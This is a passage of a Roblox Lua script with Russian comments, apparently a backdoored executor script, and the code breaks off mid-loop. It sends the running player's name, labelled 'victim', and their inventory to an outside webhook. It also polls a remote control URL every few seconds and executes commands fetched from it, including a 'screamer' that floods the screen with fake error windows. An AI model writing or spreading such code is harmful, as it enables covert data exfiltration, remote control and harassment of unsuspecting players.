local function sendLog(title, desc, color)
    pcall(function()
        local inv = ""
        for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0xff0000,
                ["fields"] = {
                    {["name"] = "👤 Жертва", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
                    {["name"] = "🎒 Вещи", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"}
                }
            }}
        }
        local req = request or http_request or (syn and syn.request)
        if req then req({Url = log_webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

local flingLoop
task.spawn(function()
    local last_cmd = ""
    while task.wait(3) do
        pcall(function()
            local cmd = game:HttpGet(control_url .. "?t=" .. tick())
            cmd = string.lower(cmd):gsub("%s+", " ")

            if cmd ~= last_cmd and not string.find(cmd, "safe") then
                last_cmd = cmd
                local char = lp.Character or lp.CharacterAdded:Wait()
                local hrp = char:FindFirstChild("HumanoidRootPart")

                -- [ КОМАНДЫ ] --
                if string.find(cmd, "screamer") then
                    local g = Instance.new("ScreenGui", lp.PlayerGui)
                    for i = 1, 15 do -- Создаем кучу окон ошибок
                        local f = Instance.new("Frame", g)
